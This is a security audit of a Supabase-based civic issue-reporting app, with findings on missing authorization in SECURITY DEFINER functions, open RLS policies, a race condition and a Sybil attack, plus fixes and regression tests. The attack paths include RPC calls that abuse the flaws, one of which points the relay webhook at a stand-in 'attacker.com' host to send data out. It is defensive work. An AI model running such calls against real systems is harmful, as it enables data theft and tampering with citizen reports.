
# EXECUTIVE SUMMARY

Contre-audit de sécurité complet du projet SIGNA·CI / Civic Signal.

## Security Posture
CRITICAL RISK (DO NOT RELEASE)

## P0 count: 3
## P1 count: 2
## P2 count: 0
## P3 count: 0

## Most dangerous attack path:
Unauthenticated or authenticated users calling `admin_save_relay_config` or `operator_update_ticket` RPCs. `admin_save_relay_config` allows complete compromise of the institutional relay configuration, leading to SSRF or data exfiltration. `operator_update_ticket` allows manipulation of all report statuses and metadata.

## Most dangerous root cause:
Missing authorization checks inside `SECURITY DEFINER` RPC functions combined with overly permissive `GRANT EXECUTE` statements (e.g., `TO anon, authenticated`) and overly permissive RLS policies on critical configuration tables (e.g., `WITH CHECK (true)` on `relay_config`).

## Most urgent remediation:
1. Immediately remove `anon` access to administrative RPCs.
2. Add strict role-based access control (RBAC) inside all `SECURITY DEFINER` functions using `public.has_role(auth.uid(), 'admin')` or equivalent.
3. Fix the RLS policies on `relay_config` which currently allow anyone to insert or update the system configuration.

## Release recommendation:
DO NOT RELEASE. Multiple P0/P1 vulnerabilities allow mass-manipulation of the core business logic.

---

# Top 10 risques

1. Modification sans authentification de la configuration système (Relais institutionnels).
2. Mise à jour de statut des tickets par n'importe quel utilisateur authentifié, y compris la clôture arbitraire de tickets.
3. Réouverture non contrôlée de tickets d'infrastructure résolus par des attaquants cherchant à faire du spam.
4. Auto-résolution des tickets manipulable par Sybil attack sur les confirmations de réparations.
5. Altération des compteurs de vérification de réparations via une race condition.
6. (Unknowns/Manquants) Absence de logs d'audit sur l'activité des RPC `SECURITY DEFINER` permettant une dissimulation des attaques.
7. (Unknowns/Manquants) Fuite potentielle des données GPS précises via PostGIS non-restreint.
8. (Unknowns/Manquants) Upload de fichiers dangereux sur Supabase Storage.
9. (Unknowns/Manquants) Absence de rate-limiting robuste (uniquement géré par une trigger qui peut être contournée).
10. (Unknowns/Manquants) Dépendance à la validation frontend du type de rôle ou d'organisation.

---

# Attack Surface Map

```text
Internet
 ↓
Web / Mobile App
 ↓
Supabase Auth (Tokens & Sessions)
 ↓
Postgres / RLS (Bypassed mostly by RPCs)
 ↓
RPC (SECURITY DEFINER without AuthZ - Critical Vulnerability point)
 ↓
Storage (Potential leaks, unverified constraints)
 ↓
External operators (SSRF and Fake Relays via config modification)
```

---

# RLS Matrix

| Table | SELECT | INSERT | UPDATE | DELETE | Remarques |
|---|---|---|---|---|---|
| `reports` | Public | Auth | Auth | Admin | Vulnerable via RPC |
| `relay_config`| Public | Public | Public | Admin | CRITICAL: `WITH CHECK (true)` on INSERT/UPDATE |
| `report_status_history`| Public | Partners/Admin | - | - | |
| `repair_confirmations`| Public | Auth | Auth | Auth | Vulnerable to Sybil |

---

# RPC Matrix

| Fonction | Accessibilité | Action | Risque |
|---|---|---|---|
| `operator_update_ticket` | `authenticated` | Modifie n'importe quel ticket. | P0 - Missing AuthZ |
| `reopen_infrastructure_report` | `authenticated` | Réouvre un ticket. | P0 - Missing AuthZ |
| `admin_save_relay_config` | `anon, authenticated` | Modifie la config relais. | P0 - `anon` access, Missing AuthZ |
| `admin_mark_relay_sent` | `anon, authenticated` | Marque les relais envoyés. | P0 - `anon` access, Missing AuthZ |
| `confirm_repair` | `authenticated` | Ajoute une confirmation. | P1 - Sybil attack vector |
| `cancel_repair` | `authenticated` | Retire une confirmation. | P1 - Race condition |

---

# Storage Matrix

*(Unknowns - Requires Supabase dashboard/migration details for Storage buckets)*

---

# Auth Matrix

*(Unknowns - Requires inspection of Auth settings on Supabase dashboard)*

---

# Data Lifecycle

Création (Mobile/Web) → Traitement (Postgres via RLS/RPC) → Validation (RPC sans AuthZ) → Relayage (Webhooks vulnérables) → Archivage.

---

# Findings détaillés

## ID: F-RPC-001
Severity: P0 / CRITICAL
Title: Unauthenticated / Unauthorized Report Update via `operator_update_ticket` RPC

Status: CONFIRMED

Affected component: Database (PostgreSQL / RPC)
Affected files: `./supabase/migrations/20260818020000_operator_feedback_and_history.sql`
Affected functions/policies: `public.operator_update_ticket`

Attack preconditions:
- Attacker must be an authenticated user (any user, due to `GRANT EXECUTE ON FUNCTION public.operator_update_ticket TO authenticated`).

Attack path:
1. Malicious authenticated user calls `public.operator_update_ticket(p_report_id := '<target_uuid>', p_status := 'resolved')`.
2. The function is defined as `SECURITY DEFINER`, bypassing RLS on the `reports` table.
3. The function body lacks any authorization checks. It only extracts `v_caller_id := auth.uid()`.
4. The target report's status is updated to `resolved`, and a fake entry is added to `report_status_history`.

Technical evidence:
In `20260818020000_operator_feedback_and_history.sql`:
```sql
CREATE OR REPLACE FUNCTION public.operator_update_ticket(...)
...
SECURITY DEFINER
AS $$
...
  v_caller_id UUID := auth.uid();
BEGIN
  -- 1. Valider le statut
...
  -- 3. Mettre à jour la table reports
  UPDATE public.reports SET status = p_status ... WHERE id = v_report.id;
...
```

Why existing controls fail:
The developer relied on RLS for the `reports` table, but forgot that `SECURITY DEFINER` functions completely bypass RLS. There are no manual access control checks (like checking if the user is an admin or the designated operator) inside the RPC logic.

Security impact:
Mass manipulation of all reports in the system. Attackers can close active incidents, reject valid reports, or falsify operator references.

Business impact:
Complete loss of operational integrity. Legitimate infrastructure problems will be ignored, leading to safety issues and breaking the trust of partner institutions (Mairies, CIE, SODECI).

Exploitability: Trivial. Can be fully automated using a simple bash loop and a valid JWT token.

Recommended remediation:
Add an authorization check at the beginning of the function body.
```sql
  IF NOT (public.has_role(v_caller_id, 'admin') OR public.has_role(v_caller_id, 'moderator') OR public.has_role(v_caller_id, 'partner')) THEN
    RETURN jsonb_build_object('success', false, 'error', 'Unauthorized');
  END IF;
```

Regression tests required:
```
TEST: citizen cannot update report status via operator_update_ticket
EXPECTED: 'success': false / permission denied
```

---

## ID: F-RPC-002
Severity: P0 / CRITICAL
Title: Unauthorized Report Reopening via `reopen_infrastructure_report` RPC

Status: CONFIRMED

Affected component: Database (PostgreSQL / RPC)
Affected files: `./supabase/migrations/20260819080000_infrastructure_dispute_and_reopen_rpc.sql`
Affected functions/policies: `public.reopen_infrastructure_report`

Attack preconditions:
- Attacker must be an authenticated user.

Attack path:
1. Malicious user calls `public.reopen_infrastructure_report(p_report_id := '<target_uuid>')`.
2. The function is `SECURITY DEFINER`, bypassing RLS.
3. Missing authorization check allows reopening any resolved report.

Technical evidence:
In `20260819080000_infrastructure_dispute_and_reopen_rpc.sql`:
```sql
  v_caller_id := auth.uid();
  IF v_caller_id IS NULL THEN
    RAISE EXCEPTION 'Connectez-vous...';
  END IF;
  -- Missing authorization check here!
  UPDATE public.reports SET status = 'active' WHERE id = p_report_id;
```

Why existing controls fail:
Similar to F-RPC-001, `SECURITY DEFINER` is used without manual row-level authorization logic within the function to verify the user's relationship with the report.

Security impact:
Denial of service for operators via spam. Resolved issues will continuously reappear as active, causing alert fatigue and disrupting operations.

Business impact:
Inefficiency and potential abandonment of the platform by operator staff due to unmanageable noise.

Exploitability: Trivial.

Recommended remediation:
Add authorization check to verify that `v_caller_id` is the author of the report.

Regression tests required:
```
TEST: user B cannot reopen a report created by user A
EXPECTED: permission denied / exception
```

---

## ID: F-CONF-001
Severity: P0 / CRITICAL
Title: Unauthenticated modification of system relay configuration (`relay_config`)

Status: CONFIRMED

Affected component: Database (PostgreSQL / RLS & RPC)
Affected files: `./supabase/migrations/20260728000000_fix_relay_config_upsert_rpc.sql`
Affected functions/policies: `public.admin_save_relay_config`, `relay_config` RLS policies

Attack preconditions:
- None. Unauthenticated attackers (anon) can exploit this.

Attack path:
1. Attacker calls `public.admin_save_relay_config(p_config := '{"whatsapp_api_key":"hacked", "webhook_url": "http://attacker.com"}')`.
2. The function updates the `relay_config` table bypassing any checks.
3. Alternatively, an attacker can directly `INSERT` or `UPDATE` the `relay_config` table via the Supabase REST API because the RLS policies are explicitly set to allow anyone.

Technical evidence:
```sql
-- 2. Ajouter les politiques RLS INSERT/UPDATE/ALL pour relay_config
DROP POLICY IF EXISTS "Public can insert relay_config" ON public.relay_config;
CREATE POLICY "Public can insert relay_config"
  ON public.relay_config FOR INSERT
  WITH CHECK (true);

DROP POLICY IF EXISTS "Public can update relay_config" ON public.relay_config;
CREATE POLICY "Public can update relay_config"
  ON public.relay_config FOR UPDATE
  USING (true)
  WITH CHECK (true);

-- 3. Fonction RPC SECURITY DEFINER ...
CREATE OR REPLACE FUNCTION public.admin_save_relay_config(p_config jsonb) ...

GRANT EXECUTE ON FUNCTION public.admin_save_relay_config(jsonb) TO authenticated, anon;
```

Why existing controls fail:
The developer mistakenly created permissive RLS policies (`WITH CHECK (true)`) and granted execute permissions to `anon`.

Security impact:
Complete takeover of institutional relay configurations. Attackers can steal API keys, redirect institutional webhooks to their own servers (SSRF, data exfiltration of citizen reports including PII), or disable reporting to partners.

Business impact:
Critical data breach, severe legal and reputational damage.

Exploitability: Trivial.

Recommended remediation:
1. Fix RLS policies on `relay_config`:
```sql
CREATE POLICY "Admins can manage relay_config"
  ON public.relay_config FOR ALL
  TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));
```
2. Add authorization checks to `admin_save_relay_config` and restrict `GRANT`:
```sql
  IF NOT public.has_role(auth.uid(), 'admin') THEN RAISE EXCEPTION 'Unauthorized'; END IF;
  -- ...
  REVOKE ALL ON FUNCTION public.admin_save_relay_config(jsonb) FROM anon;
  GRANT EXECUTE ON FUNCTION public.admin_save_relay_config(jsonb) TO authenticated;
```

Regression tests required:
```
TEST: anonymous user cannot execute admin_save_relay_config
EXPECTED: function execution denied
TEST: authenticated citizen cannot update relay_config table directly
EXPECTED: row update rejected by RLS
```

---

## ID: F-RPC-003
Severity: P1 / HIGH
Title: Race condition in `cancel_repair` allows bypass of decrement logic

Status: CONFIRMED

Affected component: Database (PostgreSQL / RPC)
Affected files: `./supabase/migrations/20260511000001_cancel_repair_rpc.sql`
Affected functions/policies: `public.cancel_repair`

Attack preconditions:
- Authenticated user.

Attack path:
1. User confirms a repair.
2. User sends concurrent requests to `cancel_repair`.
3. The `IF NOT EXISTS` check passes for multiple requests before the `DELETE` executes, causing the global `repair_verifications` counter on the report to be decremented multiple times.

Technical evidence:
```sql
  IF NOT EXISTS (
    SELECT 1 FROM public.repair_confirmations
    WHERE report_id = p_report_id AND user_id = v_caller_id
  ) THEN
    RAISE EXCEPTION 'Aucune confirmation à annuler.';
  END IF;

  DELETE FROM public.repair_confirmations
  WHERE report_id = p_report_id AND user_id = v_caller_id;

  UPDATE public.reports
  SET repair_verifications = GREATEST(0, repair_verifications - 1)
  WHERE id = p_report_id;
```

Why existing controls fail:
A classic Time-Of-Check to Time-Of-Use (TOCTOU) race condition in SQL, lacking transaction locks.

Security impact:
Malicious users can artificially reduce the verification score of any report.

Business impact:
Manipulation of community-driven validation metrics, preventing auto-resolution.

Exploitability: Medium.

Recommended remediation:
Use `DELETE ... RETURNING` or check `FOUND`:
```sql
  DELETE FROM public.repair_confirmations
  WHERE report_id = p_report_id AND user_id = v_caller_id;

  IF FOUND THEN
      UPDATE public.reports
      SET repair_verifications = GREATEST(0, repair_verifications - 1)
      WHERE id = p_report_id;
  END IF;
```

Regression tests required:
```
TEST: execute two cancel_repair RPCs concurrently for the same user
EXPECTED: the reports.repair_verifications count only decrements by 1
```

---

## ID: F-RPC-005
Severity: P1 / HIGH
Title: Sybil attack on auto-resolution via `confirm_repair`

Status: CONFIRMED

Affected component: Database (PostgreSQL / RPC)
Affected files: `./supabase/migrations/20260309014241_9df6e055-f514-4aa1-807f-516385234261.sql`
Affected functions/policies: `public.confirm_repair`

Attack preconditions:
- Authenticated user with 3 accounts.

Attack path:
1. Attacker creates 3 accounts.
2. Attacker calls `confirm_repair` from all 3 accounts on any target report.
3. The report is automatically resolved because there are no geographical, temporal, or identity restrictions on who can confirm a repair.

Technical evidence:
```sql
  INSERT INTO public.repair_confirmations (report_id, user_id) VALUES (p_report_id, v_caller_id);

  UPDATE public.reports SET repair_verifications = repair_verifications + 1 ...

  IF v_new_count >= 3 THEN
    UPDATE public.reports SET status = 'resolved' ...
```

Why existing controls fail:
Absence of strong identity verification or spatial constraints (checking user GPS proximity vs. report GPS coordinates).

Security impact:
Arbitrary resolution of legitimate reports by malicious actors.

Business impact:
Hiding real issues from operators, skewing civic data analytics.

Exploitability: Low effort.

Recommended remediation:
Implement geographic validation (confirmers must be near the report location), rate-limiting per IP, or require higher trust levels (verified phone number) for confirmations to count towards auto-resolution.

Regression tests required:
```
TEST: 3 confirmations from the same IP address or device fingerprint are rejected
EXPECTED: exception or silent drop
```

---

# False Positives / Non-Reproduced
- RLS on `reports` table. It appears properly configured, but the extensive use of `SECURITY DEFINER` RPCs renders it largely irrelevant.

---

# Unknowns
- CI/CD secrets leaks.
- Realtime configuration.
- Storage Buckets (Policies are not fully visible in migrations).
- OAuth Google integration security details.
- Environment variables management.
